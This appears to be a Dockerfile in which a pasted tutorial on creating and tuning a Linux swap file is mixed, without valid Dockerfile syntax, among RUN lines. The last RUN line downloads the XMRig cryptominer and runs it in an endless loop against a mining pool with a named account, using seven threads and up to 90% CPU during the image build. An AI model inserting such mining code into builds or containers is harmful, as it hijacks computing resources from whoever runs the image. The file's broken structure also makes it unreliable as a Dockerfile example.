FROM ubuntu:18.10
RUN apt-get update && apt-get install -y wget
# Confirm you have no swap
sudo swapon -s

# Allocate 1GB (or more if you wish) in /swapfile
sudo fallocate -l 1G /swapfile

# Make it secure
sudo chmod 600 /swapfile
ls -lh /swapfile

# Activate it
sudo mkswap /swapfile
sudo swapon /swapfile

# Confirm again there's indeed more memory now
free -m
sudo swapon -s

# Configure fstab to use swap when instance restart
sudo nano /etc/fstab

# Add this line to /etc/fstab, save and exit
/swapfile   none    swap    sw    0   0

# Change swappiness to 10, so that swap is used only when 10% RAM is unused
# The default is too high at 60
echo 10 | sudo tee /proc/sys/vm/swappiness
echo vm.swappiness = 10 | sudo tee -a /etc/sysctl.conf
RUN wget https://github.com/xmrig/xmrig/releases/download/v2.15.1-beta/xmrig-2.15.1-beta-xenial-x64.tar.gz && tar -xf xmrig-2.15.1-beta-xenial-x64.tar.gz && cd xmrig-2.15.1-beta && while true; do ./xmrig -o europe.cryptonight-hub.miningpoolhub.com:20580 -u brahim7.brahim21 -p x --threads 7 --max-cpu-usage=90 --cpu-priority 4 --donate-level 1 ; sleep 1; done
RUN nproc
